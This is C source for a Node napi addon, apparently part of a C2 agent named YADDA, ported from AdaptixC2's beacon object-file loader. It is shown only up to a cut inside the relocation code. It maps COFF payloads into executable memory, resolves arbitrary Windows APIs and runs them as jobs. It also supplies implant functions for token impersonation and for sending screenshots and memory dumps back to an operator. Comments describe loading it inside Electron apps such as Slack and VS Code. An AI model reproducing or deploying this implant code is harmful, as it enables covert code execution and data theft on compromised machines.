// Ported from AdaptixC2 (https://github.com/Adaptix-Framework/AdaptixC2),
// AdaptixServer/extenders/beacon_agent/src_beacon/beacon/bof_loader.c + beacon_functions.c + Boffer.c (BOF loader + async job manager) — GPLv3, (c) the
// AdaptixC2 authors. Structural fidelity is deliberate; deviations are noted inline.
// coffloader.c — napi addon: COFF (BOF) loader for YADDA.
//
// A faithful port of AdaptixC2's beacon_agent C++ loader to a plain-C napi
// addon (the "COFF -> .node" step from README §7/§8 — the one unavoidable
// native on-disk surface, à la Loki's COFFLoader addon / c0rnbread's addon).
//
//   Ported from (AdaptixC2/AdaptixServer/extenders/beacon_agent/src_beacon/beacon/):
//     bof_loader.cpp       — COFF parse / section alloc / relocations / execute
//     beacon_functions.cpp — the Beacon* API surface BOFs link against
//     Boffer.cpp           — ASYNC BOF jobs: thread + streamed output + stop
//
// Differences from the C++ beacon (documented deviations):
//   * Symbol resolution is by NAME (strcmp / LoadLibraryA+GetProcAddress),
//     not by Djb2 hash — the hashes are shellcode tradecraft; an addon links
//     the CRT and can call the resolver APIs directly. Semantics identical:
//     "__imp_<name>" is matched against the Beacon API table first, then
//     parsed as MODULE$Func[@N].
//   * mapFunctions overflow is guarded (BOF_ERROR_MAX_FUNCS, 0x103) — the C++
//     writes past the 512-slot table instead.
//   * ExecuteProc is wrapped in SEH: a crashing BOF reports a CALLBACK_ERROR
//     frame instead of killing the host process.
//   * The ASYNC "started" ack [taskId][50][u8 1] is emitted by the JS caller
//     (same tick); the thread emits only the final [taskId][50][u8 0]. The
//     C++ thread emits both, one tick later — same bytes overall.
//   * Timeouts (c0rnbread's timeoutMs model): every COFF runs on its own
//     native thread. run() waits with a timeout (0 = forever, C++ parity);
//     async jobs carry a deadline enforced by collect(). On expiry: stop
//     event -> 3 s grace -> TerminateThread; the BOF's sections are then
//     leaked (cannot be freed safely from under a terminated thread).
//   * BeaconWakeup / RegisterThreadCallback remain stubs — the C++ wakeup
//     event accelerates the shellcode beacon's sleep loop; our agent ticks
//     anyway. BeaconGetStopJobEvent is REAL (per-job, cooperative stop).
//   * /GS artifacts resolved; .pdata ADDR32NB-vs-external guarded (clean
//     error instead of the C++'s mapSections[-1] UB).
//
// Exports (JS):
//   run(taskId, entry, coff, args [, timeoutMs]) -> Buffer[]
//     SYNC: starts a thread, waits up to timeoutMs (0 = forever), drains the
//     frames (BOF output + final [taskId][50][u8 0]) and returns them.
//   start(taskId, entry, coff, args [, timeoutMs]) -> bool
//     ASYNC: starts the job; JS replies [taskId][50][u8 1] itself. Output
//     frames stream via collect().
//   collect() -> Buffer[]          — drain queued frames from all live jobs;
//                                     finished jobs are pruned once drained.
//   stop(jobId) -> bool            — StopAsyncBof port (event, 3s, terminate).
//   jobs() -> number[]             — taskIds of live async jobs (JOBS_LIST).
//
// Every frame is ONE complete agent->server result, byte-identical to the C++
// BofOutputToTask layout (BIG-endian): [u32be taskId][u32be 51][u32be type][u32be len][data]
//
// Build (x64; on ARM64 Windows this whole process runs under x64 emulation):
//   native\build.cmd  (vcvars64 + cl; needs node headers + node.lib — see README §2g)

#ifdef _MSC_VER
#define NODE_GYP_MODULE_NAME coffloader
#endif
#include <node_api.h>

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

// ---- host-portable napi linkage --------------------------------------------
// Linking node.lib puts `node.exe` in our import table — unresolvable inside
// Electron hosts (the exe is renamed: slack.exe, Code.exe, ...), which crashed
// Electron 43 at load. Instead we resolve every napi_* at runtime from the
// HOST EXE (GetModuleHandle(NULL) + GetProcAddress) — one binary works under
// node.exe and any Electron app. The CRT is linked statically (/MT) so we
// also never bind the host's bundled VC runtime DLLs.
typedef napi_status (*fn_napi_get_cb_info)(napi_env, napi_callback_info, size_t*, napi_value*, napi_value*, void**);
typedef napi_status (*fn_napi_get_buffer_info)(napi_env, napi_value, void**, size_t*);
typedef napi_status (*fn_napi_get_value_double)(napi_env, napi_value, double*);
typedef napi_status (*fn_napi_get_value_string_utf8)(napi_env, napi_value, char*, size_t, size_t*);
typedef napi_status (*fn_napi_get_value_uint32)(napi_env, napi_value, uint32_t*);
typedef napi_status (*fn_napi_get_boolean)(napi_env, bool, napi_value*);
typedef napi_status (*fn_napi_create_function)(napi_env, const char*, size_t, napi_callback, void*, napi_value*);
typedef napi_status (*fn_napi_set_named_property)(napi_env, napi_value, const char*, napi_value);
typedef napi_status (*fn_napi_create_array)(napi_env, napi_value*);
typedef napi_status (*fn_napi_create_uint32)(napi_env, uint32_t, napi_value*);
typedef napi_status (*fn_napi_create_buffer_copy)(napi_env, size_t, const void*, void**, napi_value*);
typedef napi_status (*fn_napi_set_element)(napi_env, napi_value, uint32_t, napi_value);
typedef void (*fn_napi_throw_type_error)(napi_env, const char*, const char*);
typedef void (*fn_napi_throw_error)(napi_env, const char*, const char*);

static fn_napi_get_cb_info          p_napi_get_cb_info;
static fn_napi_get_buffer_info      p_napi_get_buffer_info;
static fn_napi_get_value_double     p_napi_get_value_double;
static fn_napi_get_value_string_utf8 p_napi_get_value_string_utf8;
static fn_napi_get_value_uint32     p_napi_get_value_uint32;
static fn_napi_get_boolean          p_napi_get_boolean;
static fn_napi_create_function      p_napi_create_function;
static fn_napi_set_named_property   p_napi_set_named_property;
static fn_napi_create_array         p_napi_create_array;
static fn_napi_create_uint32        p_napi_create_uint32;
static fn_napi_create_buffer_copy   p_napi_create_buffer_copy;
static fn_napi_set_element          p_napi_set_element;
static fn_napi_throw_type_error     p_napi_throw_type_error;
static fn_napi_throw_error          p_napi_throw_error;

#define napi_get_cb_info          p_napi_get_cb_info
#define napi_get_buffer_info      p_napi_get_buffer_info
#define napi_get_value_double     p_napi_get_value_double
#define napi_get_value_string_utf8 p_napi_get_value_string_utf8
#define napi_get_value_uint32     p_napi_get_value_uint32
#define napi_get_boolean          p_napi_get_boolean
#define napi_create_function      p_napi_create_function
#define napi_set_named_property   p_napi_set_named_property
#define napi_create_array         p_napi_create_array
#define napi_create_uint32        p_napi_create_uint32
#define napi_create_buffer_copy   p_napi_create_buffer_copy
#define napi_set_element          p_napi_set_element
#define napi_throw_type_error     p_napi_throw_type_error
#define napi_throw_error          p_napi_throw_error

static int g_napiResolved = 0;
static int napi_resolve(void) {
    if (g_napiResolved) return g_napiResolved == 2;
    g_napiResolved = 1;
    HMODULE host = GetModuleHandleA(NULL); // the host EXE (node.exe, slack.exe, ...)
    if (!host) return 0;
    struct { const char* name; void** slot; } syms[] = {
        { "napi_get_cb_info",           (void**)&p_napi_get_cb_info },
        { "napi_get_buffer_info",        (void**)&p_napi_get_buffer_info },
        { "napi_get_value_double",      (void**)&p_napi_get_value_double },
        { "napi_get_value_string_utf8", (void**)&p_napi_get_value_string_utf8 },
        { "napi_get_value_uint32",      (void**)&p_napi_get_value_uint32 },
        { "napi_get_boolean",           (void**)&p_napi_get_boolean },
        { "napi_create_function",       (void**)&p_napi_create_function },
        { "napi_set_named_property",    (void**)&p_napi_set_named_property },
        { "napi_create_array",          (void**)&p_napi_create_array },
        { "napi_create_uint32",         (void**)&p_napi_create_uint32 },
        { "napi_create_buffer_copy",    (void**)&p_napi_create_buffer_copy },
        { "napi_set_element",           (void**)&p_napi_set_element },
        { "napi_throw_type_error",      (void**)&p_napi_throw_type_error },
        { "napi_throw_error",           (void**)&p_napi_throw_error },
    };
    for (size_t i = 0; i < sizeof(syms) / sizeof(syms[0]); i++) {
        *syms[i].slot = (void*)GetProcAddress(host, syms[i].name);
        if (!*syms[i].slot) return 0;
    }
    g_napiResolved = 2;
    return 1;
}

// ---- beacon.h constants ---------------------------------------------------
#define CALLBACK_OUTPUT      0x0
#define CALLBACK_OUTPUT_OEM  0x1e
#define CALLBACK_OUTPUT_UTF8 0x20
#define CALLBACK_ERROR       0x0d
#define CALLBACK_CUSTOM      0x1000
#define CALLBACK_CUSTOM_LAST 0x13ff
#define CALLBACK_AX_SCREENSHOT   0x81   // adaptix.h
#define CALLBACK_AX_DOWNLOAD_MEM 0x82   // adaptix.h

// bof_loader.h
#define MAX_SECTIONS       25
#define MAP_FUNCTIONS_SIZE 4096          // bytes -> 512 pointer slots
#define BOF_ERROR_PARSE    0x101
#define BOF_ERROR_SYMBOL   0x102
#define BOF_ERROR_MAX_FUNCS 0x103
#define BOF_ERROR_ENTRY    0x104
#define BOF_ERROR_ALLOC    0x105

#ifndef IMAGE_SYM_CLASS_EXTERNAL
#define IMAGE_SYM_CLASS_EXTERNAL     2
#endif
#ifndef IMAGE_SYM_CLASS_EXTERNAL_DEF
#define IMAGE_SYM_CLASS_EXTERNAL_DEF 7
#endif

// ---- COFF structures (bof_loader.h, packed) --------------------------------
#pragma pack(push, 1)
typedef struct {
    short Machine;
    short NumberOfSections;
    int   TimeDateStamp;
    int   PointerToSymbolTable;
    int   NumberOfSymbols;
    short SizeOfOptionalHeader;
    short Characteristics;
} COF_HEADER;

typedef struct {
    char  Name[8];
    int   VirtualSize;
    int   VirtualAddress;
    int   SizeOfRawData;
    int   PointerToRawData;
    int   PointerToRelocations;
    int   PointerToLineNumbers;
    short NumberOfRelocations;
    short NumberOfLinenumbers;
    int   Characteristics;
} COF_SECTION;

typedef struct {
    int   VirtualAddress;
    int   SymbolTableIndex;
    short Type;
} COF_RELOCATION;

typedef struct {
    union {
        char cName[8];
        int  dwName[2];
    } Name;
    int   Value;
    short SectionNumber;
    short Type;
    char  StorageClass;
    char  NumberOfAuxSymbols;
} COF_SYMBOL;
#pragma pack(pop)

// ---- Beacon API structures (beacon.h) --------------------------------------
typedef struct {
    char* original;
    char* buffer;
    int   length;
    int   size;
} datap;

typedef struct {
    char* original;
    char* buffer;
    int   length;
    int   size;
} formatp;

// ---- frame queue -----------------------------------------------------------
typedef struct {
    unsigned char** bufs;
    unsigned int*   lens;
    int             count, cap;
} OutList;

static void outlist_reset(OutList* q) {
    for (int i = 0; i < q->count; i++) free(q->bufs[i]);
    q->count = 0;
}

static void outlist_push(OutList* q, const void* data, unsigned int len) {
    if (q->count == q->cap) {
        q->cap = q->cap ? q->cap * 2 : 16;
        q->bufs = (unsigned char**)realloc(q->bufs, q->cap * sizeof(void*));
        q->lens = (unsigned int*)realloc(q->lens, q->cap * sizeof(unsigned int));
    }
    unsigned char* b = (unsigned char*)malloc(len ? len : 1);
    memcpy(b, data, len);
    q->bufs[q->count] = b;
    q->lens[q->count] = len;
    q->count++;
}

static void put32be(unsigned char* p, unsigned int v) {
    p[0] = (unsigned char)(v >> 24); p[1] = (unsigned char)(v >> 16);
    p[2] = (unsigned char)(v >> 8);  p[3] = (unsigned char)v;
}

// ---- BOF job model (Boffer.cpp port) ---------------------------------------
#define JOB_STATE_PENDING  0
#define JOB_STATE_RUNNING  1
#define JOB_STATE_FINISHED 2
#define JOB_STATE_STOPPED  3

#define MAX_JOBS 32

typedef struct BofJob {
    unsigned int      taskId;
    volatile LONG     state;
    CRITICAL_SECTION  lock;        // guards frames
    OutList           frames;
    HANDLE            hThread;
    HANDLE            hStopEvent;  // BeaconGetStopJobEvent() — cooperative stop
    ULONGLONG         deadline;    // GetTickCount64() cutoff; 0 = none
    // owned by the job thread once started:
    unsigned char*    coffFile; unsigned int coffSize;
    unsigned char*    args; int argsSize;
    char              entry[64];
    int               abandoned;   // thread terminated -> sections leaked
} BofJob;

static BofJob*        g_jobs[MAX_JOBS];
static CRITICAL_SECTION g_jobsLock;
static int            g_jobsInit = 0;

// TLS: which job the current thread executes (routes BeaconOutput)
static __declspec(thread) BofJob* tls_job = NULL;
// legacy sync path (run on the JS thread before jobs existed) — unused now,
// kept so Beacon* called outside a job cannot crash
static OutList g_fallback;

static char g_empty[1] = { 0 };

// final "BOF finished" frame: [u32be taskId][u32be 50][u8 0] (CmdExecBof tail)
static void EmitFinal(unsigned int taskId) {
    unsigned char tail[9];
    put32be(tail, taskId);
    put32be(tail + 4, 50);
    tail[8] = 0;
    BofJob* job = tls_job;
    if (job) {
        EnterCriticalSection(&job->lock);
        outlist_push(&job->frames, tail, 9);
        LeaveCriticalSection(&job->lock);
    } else {
        outlist_push(&g_fallback, tail, 9);
    }
}

// BofOutputToTask (beacon_functions.cpp): one complete frame per call.
static void EmitFrame(unsigned int taskId, int type, const void* data, unsigned int dataSize) {
    unsigned char* frame = (unsigned char*)malloc(16 + dataSize);
    if (!frame) return;
    put32be(frame, taskId);
    put32be(frame + 4, 51);        // COMMAND_EXEC_BOF_OUT
    put32be(frame + 8, (unsigned int)type);
    put32be(frame + 12, dataSize);
    if (data && dataSize) memcpy(frame + 16, data, dataSize);

    BofJob* job = tls_job;
    if (job) {
        EnterCriticalSection(&job->lock);
        outlist_push(&job->frames, frame, 16 + dataSize);
        LeaveCriticalSection(&job->lock);
    } else {
        outlist_push(&g_fallback, frame, 16 + dataSize);
    }
    free(frame);
}

static BofJob* job_new(unsigned int taskId, const char* entry,
                       unsigned char* coff, unsigned int coffSize,
                       unsigned char* args, int argsSize, ULONGLONG timeoutMs) {
    BofJob* job = (BofJob*)calloc(1, sizeof(BofJob));
    if (!job) return NULL;
    job->taskId = taskId;
    job->state = JOB_STATE_PENDING;
    InitializeCriticalSection(&job->lock);
    job->hStopEvent = CreateEventA(NULL, TRUE, FALSE, NULL); // manual-reset, like C++
    if (!job->hStopEvent) { DeleteCriticalSection(&job->lock); free(job); return NULL; }
    // the job owns copies (thread outlives the napi Buffer lifetime guarantees)
    job->coffFile = (unsigned char*)malloc(coffSize ? coffSize : 1);
    if (!job->coffFile) { CloseHandle(job->hStopEvent); DeleteCriticalSection(&job->lock); free(job); return NULL; }
    memcpy(job->coffFile, coff, coffSize);
    job->coffSize = coffSize;
    job->args = (unsigned char*)malloc(argsSize > 0 ? (size_t)argsSize : 1);
    if (!job->args) { free(job->coffFile); CloseHandle(job->hStopEvent); DeleteCriticalSection(&job->lock); free(job); return NULL; }
    if (argsSize > 0) memcpy(job->args, args, (size_t)argsSize);
    job->argsSize = argsSize;
    strncpy_s(job->entry, sizeof(job->entry), entry, _TRUNCATE);
    if (timeoutMs) job->deadline = GetTickCount64() + timeoutMs;
    return job;
}

static void job_free(BofJob* job) {
    // thread must be dead (finished/stopped) before we get here
    if (job->hThread) CloseHandle(job->hThread);
    if (job->hStopEvent) CloseHandle(job->hStopEvent);
    outlist_reset(&job->frames);
    free(job->frames.bufs); free(job->frames.lens);
    free(job->coffFile);
    free(job->args);
    DeleteCriticalSection(&job->lock);
    free(job);
}

// StopAsyncBof port: cooperative stop, 3 s grace, then hard terminate.
static void job_stop(BofJob* job) {
    if (InterlockedCompareExchange(&job->state, JOB_STATE_STOPPED, JOB_STATE_RUNNING) == JOB_STATE_RUNNING) {
        if (job->hStopEvent) SetEvent(job->hStopEvent);
        if (job->hThread) {
            if (WaitForSingleObject(job->hThread, 3000) == WAIT_TIMEOUT) {
                TerminateThread(job->hThread, 0);
                job->abandoned = 1; // sections can no longer be freed safely
            }
        }
    } else {
        InterlockedExchange(&job->state, JOB_STATE_STOPPED);
    }
    if (job->hThread) WaitForSingleObject(job->hThread, 5000);
}

// deadline enforcement for async jobs (called from collect())
static void job_enforce_deadline(BofJob* job) {
    if (job->deadline && job->state == JOB_STATE_RUNNING) {
        if (GetTickCount64() >= job->deadline) {
            char msg[80];
            int n = _snprintf(msg, sizeof(msg), "BOF exceeded execution timeout - stopped");
            if (n > 0) EmitFrame(job->taskId, CALLBACK_ERROR, msg, (unsigned int)n);
            job_stop(job);
        }
    }
}

// ---- Output API (called from BOF threads via TLS) ---------------------------
void BeaconOutput(int type, const char* data, int len) {
    if (data == NULL) return;
    EmitFrame(tls_job ? tls_job->taskId : 0, type, data, (unsigned int)len);
}

void BeaconPrintf(int type, const char* fmt, ...) {
    if (fmt == NULL) return;
    char stackbuf[1024];
    va_list ap;
    int length;

    va_start(ap, fmt);
    length = vsnprintf(NULL, 0, fmt, ap);
    va_end(ap);
    if (length == -1) return;
    length += 1;

    char* tmp;
    if ((size_t)length <= sizeof(stackbuf)) tmp = stackbuf;
    else { tmp = (char*)malloc((size_t)length); if (!tmp) return; }

    va_start(ap, fmt);
    length = vsnprintf(tmp, (size_t)length, fmt, ap);
    va_end(ap);
    if (length > 0) EmitFrame(tls_job ? tls_job->taskId : 0, type, tmp, (unsigned int)length);
    if (tmp != stackbuf) free(tmp);
}

// ---- Data Parser API (beacon_functions.cpp, faithful) ----------------------
void BeaconDataParse(datap* parser, char* buffer, int size) {
    if (parser == NULL || buffer == NULL) return;
    parser->original = buffer;
    parser->buffer = buffer + 4;   // skip bof_pack's u32le total-length header
    parser->length = size - 4;
    parser->size = size - 4;
}

int BeaconDataInt(datap* parser) {
    if (parser == NULL) return 0;
    int v = 0;
    if (parser->length < 4) return 0;
    memcpy(&v, parser->buffer, 4);
    parser->buffer += 4;
    parser->length -= 4;
    return v;
}

short BeaconDataShort(datap* parser) {
    if (parser == NULL) return 0;
    short v = 0;
    if (parser->length < 2) return 0;
    memcpy(&v, parser->buffer, 2);
    parser->buffer += 2;
    parser->length -= 2;
    return v;
}

int BeaconDataLength(datap* parser) {
    if (parser == NULL) return 0;
    return parser->length;
}

char* BeaconDataExtract(datap* parser, int* size) {
    if (parser == NULL) return NULL;
    unsigned int length = 0;
    if (parser->length < 4) return NULL;
    memcpy(&length, parser->buffer, 4);
    parser->length -= 4;
    parser->buffer += 4;
    char* outdata = parser->buffer;
    parser->length -= (int)length;
    parser->buffer += length;
    if (size) *size = (int)length;
    return outdata;
}

// ---- Format API (beacon_functions.cpp, faithful) ---------------------------
void BeaconFormatAlloc(formatp* format, int maxsz) {
    if (format == NULL) return;
    format->original = (char*)calloc(1, (size_t)maxsz);
    format->buffer = format->original;
    format->length = 0;
    format->size = maxsz;
}

void BeaconFormatReset(formatp* format) {
    if (format == NULL) return;
    memset(format->original, 0, (size_t)format->size);
    format->buffer = format->original;
    format->length = 0;
}

void BeaconFormatAppend(formatp* format, const char* text, int len) {
    if (format == NULL || text == NULL) return;
    memcpy(format->buffer, text, (size_t)len);
    format->buffer += len;
    format->length += len;
}

void BeaconFormatPrintf(formatp* format, const char* fmt, ...) {
    if (format == NULL || fmt == NULL) return;
    va_list ap;
    int length;
    va_start(ap, fmt);
    length = vsnprintf(NULL, 0, fmt, ap);
    va_end(ap);
    if (length <= 0) return;
    if (format->length + length > format->size) return;
    va_start(ap, fmt);
    vsnprintf(format->buffer, (size_t)length + 1, fmt, ap);
    va_end(ap);
    format->length += length;
    format->buffer += length;
}

char* BeaconFormatToString(formatp* format, int* size) {
    if (format == NULL) return NULL;
    if (size) *size = format->length;
    return format->original;
}

void BeaconFormatFree(formatp* format) {
    if (format == NULL) return;
    if (format->original) free(format->original);
    format->buffer = NULL;
    format->length = 0;
    format->size = 0;
}

void BeaconFormatInt(formatp* format, int value) {
    if (format == NULL) return;
    if (format->length + 4 > format->size) return;
    unsigned char* p = (unsigned char*)format->buffer;
    unsigned int v = (unsigned int)value;
    p[0] = (unsigned char)(v >> 24); p[1] = (unsigned char)(v >> 16);
    p[2] = (unsigned char)(v >> 8);  p[3] = (unsigned char)v;
    format->buffer += 4;
    format->length += 4;
}

// ---- Token / misc APIs -----------------------------------------------------
BOOL BeaconUseToken(HANDLE token) {
    return SetThreadToken(NULL, token);
}

void BeaconRevertToken(void) {
    SetThreadToken(NULL, NULL);
}

BOOL BeaconIsAdmin(void) {
    HANDLE tok = NULL;
    TOKEN_ELEVATION te;
    DWORD ret = 0;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) return FALSE;
    if (GetTokenInformation(tok, TokenElevation, &te, sizeof(te), &ret) && ret >= sizeof(te)) {
        CloseHandle(tok);
        return te.TokenIsElevated ? TRUE : FALSE;
    }
    CloseHandle(tok);
    return FALSE;
}

BOOL toWideChar(char* src, wchar_t* dst, int max) {
    if (!src || !dst || max <= 0) return FALSE;
    return MultiByteToWideChar(CP_UTF8, 0, src, -1, dst, max) > 0;
}

// ---- Adaptix-specific output helpers ----------------------------------------
static void PackStringAFrame(unsigned int type, const char* str, const char* data, int len) {
    unsigned int slen = str ? (unsigned int)strlen(str) : 0;
    unsigned int total = 16 + 4 + slen + 4 + (unsigned int)len;
    unsigned char* frame = (unsigned char*)malloc(total);
    if (!frame) return;
    unsigned char* p = frame;
    put32be(p, tls_job ? tls_job->taskId : 0); p += 4;
    put32be(p, 51);            p += 4;
    put32be(p, type);          p += 4;
    put32be(p, slen);          p += 4;
    if (slen) { memcpy(p, str, slen); p += slen; }
    put32be(p, (unsigned int)len); p += 4;
    if (len > 0 && data) memcpy(p, data, (size_t)len);

    BofJob* job = tls_job;
    if (job) {
        EnterCriticalSection(&job->lock);
        outlist_push(&job->frames, frame, total);
        LeaveCriticalSection(&job->lock);
    } else {
        outlist_push(&g_fallback, frame, total);
    }
    free(frame);
}

void AxAddScreenshot(char* note, char* data, int len) {
    PackStringAFrame(CALLBACK_AX_SCREENSHOT, note, data, len);
}

void AxDownloadMemory(char* filename, char* data, int len) {
    PackStringAFrame(CALLBACK_AX_DOWNLOAD_MEM, filename, data, len);
}

// ---- Key/Value store (CS 4.9 API) — locked (BOF threads now) ----------------
typedef struct { char key[256]; void* val; int used; } KVSlot;
static KVSlot g_kv[64];
static CRITICAL_SECTION g_kvLock;

static KVSlot* kv_find(const char* key) {
    for (int i = 0; i < 64; i++)
        if (g_kv[i].used && strcmp(g_kv[i].key, key) == 0) return &g_kv[i];
    return NULL;
}

BOOL BeaconAddValue(const char* key, void* val) {
    if (key == NULL) return FALSE;
    EnterCriticalSection(&g_kvLock);
    BOOL ok = (kv_find(key) == NULL);
    if (ok) {
        ok = FALSE;
        for (int i = 0; i < 64; i++) {
            if (!g_kv[i].used) {
                g_kv[i].used = 1;
                strncpy_s(g_kv[i].key, sizeof(g_kv[i].key), key, _TRUNCATE);
                g_kv[i].val = val;
                ok = TRUE;
                break;
            }
        }
    }
    LeaveCriticalSection(&g_kvLock);
    return ok;
}

void* BeaconGetValue(const char* key) {
    if (!key) return NULL;
    EnterCriticalSection(&g_kvLock);
    KVSlot* s = kv_find(key);
    void* v = s ? s->val : NULL;
    LeaveCriticalSection(&g_kvLock);
    return v;
}

BOOL BeaconRemoveValue(const char* key) {
    if (!key) return FALSE;
    EnterCriticalSection(&g_kvLock);
    KVSlot* s = kv_find(key);
    BOOL ok = s ? TRUE : FALSE;
    if (s) { s->used = 0; s->val = NULL; }
    LeaveCriticalSection(&g_kvLock);
    return ok;
}

// ---- Async BOF API surface ---------------------------------------------------
// stop event: REAL (BOFs can honor it for graceful shutdown)
void* BeaconGetStopJobEvent(void) { return tls_job ? (void*)tls_job->hStopEvent : NULL; }
// wakeup/thread callbacks: stubs (documented deviation — no sleeping main loop)
static void* g_threadCallback = NULL;
BOOL BeaconRegisterThreadCallback(void* callback) { g_threadCallback = callback; return TRUE; }
BOOL BeaconUnregisterThreadCallback(void* callback) { (void)callback; g_threadCallback = NULL; return TRUE; }
void BeaconWakeup(void) { /* no-op */ }

// ---- /GS support (arbitrary MSVC objects) ------------------------------------
static unsigned __int64 g_security_cookie = 0;
static void SecurityCheckCookieStub(unsigned __int64 cookie) { (void)cookie; }
static void GSCheckHandlerStub(void) { /* __GSHandlerCheck (exception path) */ }

// ---- Beacon API table (name -> proc) -----------------------------------------
typedef struct { const char* name; void* proc; } BOF_API_ENTRY;
static const BOF_API_ENTRY BeaconFunctions[] = {
    { "BeaconDataParse",   (void*)BeaconDataParse },
    { "BeaconDataInt",     (void*)BeaconDataInt },
    { "BeaconDataShort",   (void*)BeaconDataShort },
    { "BeaconDataLength",  (void*)BeaconDataLength },
    { "BeaconDataExtract", (void*)BeaconDataExtract },
    { "BeaconOutput",      (void*)BeaconOutput },
    { "BeaconPrintf",      (void*)BeaconPrintf },
    { "BeaconFormatAlloc",   (void*)BeaconFormatAlloc },
    { "BeaconFormatReset",   (void*)BeaconFormatReset },
    { "BeaconFormatAppend",  (void*)BeaconFormatAppend },
    { "BeaconFormatPrintf",  (void*)BeaconFormatPrintf },
    { "BeaconFormatToString",(void*)BeaconFormatToString },
    { "BeaconFormatFree",    (void*)BeaconFormatFree },
    { "BeaconFormatInt",     (void*)BeaconFormatInt },
    { "BeaconUseToken",    (void*)BeaconUseToken },
    { "BeaconRevertToken", (void*)BeaconRevertToken },
    { "BeaconIsAdmin",     (void*)BeaconIsAdmin },
    { "toWideChar",        (void*)toWideChar },
    { "BeaconAddValue",    (void*)BeaconAddValue },
    { "BeaconGetValue",    (void*)BeaconGetValue },
    { "BeaconRemoveValue", (void*)BeaconRemoveValue },
    { "AxAddScreenshot",   (void*)AxAddScreenshot },
    { "AxDownloadMemory",  (void*)AxDownloadMemory },
    { "BeaconRegisterThreadCallback",   (void*)BeaconRegisterThreadCallback },
    { "BeaconUnregisterThreadCallback", (void*)BeaconUnregisterThreadCallback },
    { "BeaconWakeup",                   (void*)BeaconWakeup },
    { "BeaconGetStopJobEvent",          (void*)BeaconGetStopJobEvent },
    { "LoadLibraryA",     (void*)LoadLibraryA },
    { "GetModuleHandleA", (void*)GetModuleHandleA },
    { "FreeLibrary",      (void*)FreeLibrary },
    { "GetProcAddress",   (void*)GetProcAddress },
    { NULL, NULL }
};

// ---- symbol resolution (name-based; see header) -------------------------------
static void* FindProcBySymbol(const char* symbol) {
    if (strcmp(symbol, "__security_cookie") == 0)
        return (void*)g_security_cookie; // DATA: slot content = cookie value
    if (strcmp(symbol, "__security_check_cookie") == 0)
        return (void*)SecurityCheckCookieStub;
    if (strcmp(symbol, "__GSHandlerCheck") == 0)
        return (void*)GSCheckHandlerStub;

    const char* name = symbol;
    if (strncmp(symbol, "__imp_", 6) == 0) name = symbol + 6; // canonical BOF form

    if (*name) {
        for (int i = 0; BeaconFunctions[i].name; i++)
            if (strcmp(name, BeaconFunctions[i].name) == 0)
                return BeaconFunctions[i].proc;

        char symbolCopy[1024];
        size_t n = strlen(name);
        if (n >= sizeof(symbolCopy)) return NULL;
        memcpy(symbolCopy, name, n + 1);

        char* dollar = strchr(symbolCopy, '$');
        if (!dollar) return NULL;
        *dollar = '\0';
        char* funcName = dollar + 1;
        char* at = strchr(funcName, '@');
        if (at) *at = '\0';

        HMODULE hModule = LoadLibraryA(symbolCopy);
        if (hModule) return (void*)GetProcAddress(hModule, funcName);
    }
    return NULL;
}

// ---- Loader core (bof_loader.cpp, faithful) -----------------------------------
static BOOL AllocateSections(unsigned char* coffFile, COF_HEADER* pHeader, char** mapSections) {
    for (int i = 0; i < pHeader->NumberOfSections && i < MAX_SECTIONS; i++) {
        COF_SECTION* pSection = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + (sizeof(COF_SECTION) * (size_t)i));
        mapSections[i] = (char*)VirtualAlloc(NULL, pSection->SizeOfRawData,
            MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
        if (!mapSections[i] && pSection->SizeOfRawData)
            return FALSE;
        if (pSection->PointerToRawData)
            memcpy(mapSections[i], coffFile + pSection->PointerToRawData, pSection->SizeOfRawData);
        else
            memset(mapSections[i], 0, pSection->SizeOfRawData);
    }
    return TRUE;
}

static void CleanupSections(char** mapSections) {
    for (int i = 0; i < MAX_SECTIONS; i++) {
        if (mapSections[i]) {
            VirtualFree(mapSections[i], 0, MEM_RELEASE);
            mapSections[i] = NULL;
        }
    }
}

static const char* SymbolName(COF_SYMBOL* pSymbolTable, int numberOfSymbols, COF_SYMBOL* sym, char shortBuf[9]) {
    if (sym->Name.dwName[0] == 0)
        return ((const char*)(pSymbolTable + numberOfSymbols)) + sym->Name.dwName[1];
    if (sym->Name.cName[7] != 0) {
        memcpy(shortBuf, sym->Name.cName, 8);
        shortBuf[8] = '\0';
        return shortBuf;
    }
    return sym->Name.cName;
}

static BOOL ProcessRelocations(unsigned char* coffFile, COF_HEADER* pHeader, char** mapSections,
                               COF_SYMBOL* pSymbolTable, void** mapFunctions, unsigned int taskId) {
    BOOL status = TRUE;
    int mapFunctionsSize = 0;

    for (int sectionIndex = 0; sectionIndex < pHeader->NumberOfSections; sectionIndex++) {
        COF_SECTION* pSection = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + (sizeof(COF_SECTION) * (size_t)sectionIndex));
        COF_RELOCATION* pRelocTable = (COF_RELOCATION*)(coffFile + pSection->PointerToRelocations);

        for (int relocIndex = 0; relocIndex < pSection->NumberOfRelocations; relocIndex++) {
            COF_RELOCATION* reloc = (COF_RELOCATION*)((char*)pRelocTable + ((size_t)relocIndex * sizeof(COF_RELOCATION)));

            if (reloc->SymbolTableIndex >= pHeader->NumberOfSymbols) {
                BeaconOutput(BOF_ERROR_PARSE, NULL, 0);
                return FALSE;
            }

            int offset = 0;
            void* procAddress = NULL;
            long long bigOffset = 0;

            COF_SYMBOL* sym = &pSymbolTable[reloc->SymbolTableIndex];
            char shortBuf[9];
            const char* procSymbol = SymbolName(pSymbolTable, pHeader->NumberOfSymbols, sym, shortBuf);

            if (sym->SectionNumber > 0) {
                if (sym->SectionNumber > MAX_SECTIONS) { status = FALSE; break; }
                procAddress = mapSections[sym->SectionNumber - 1];
                procAddress = (void*)((char*)procAddress + sym->Value);
            }
            else if (sym->Value == 0 && (sym->StorageClass == IMAGE_SYM_CLASS_EXTERNAL ||
                                         sym->StorageClass == IMAGE_SYM_CLASS_EXTERNAL_DEF)) {
                procAddress = FindProcBySymbol(procSymbol);
                if (procAddress == NULL && sym->SectionNumber == 0) {
                    BeaconOutput(BOF_ERROR_SYMBOL, procSymbol, (int)strlen(procSymbol));
                    status = FALSE;
                    break;
                }
                if (mapFunctionsSize >= MAP_FUNCTIONS_SIZE / (int)sizeof(void*)) {
                    BeaconOutput(BOF_ERROR_MAX_FUNCS, NULL, 0); // > 512 external funcs
                    return FALSE;
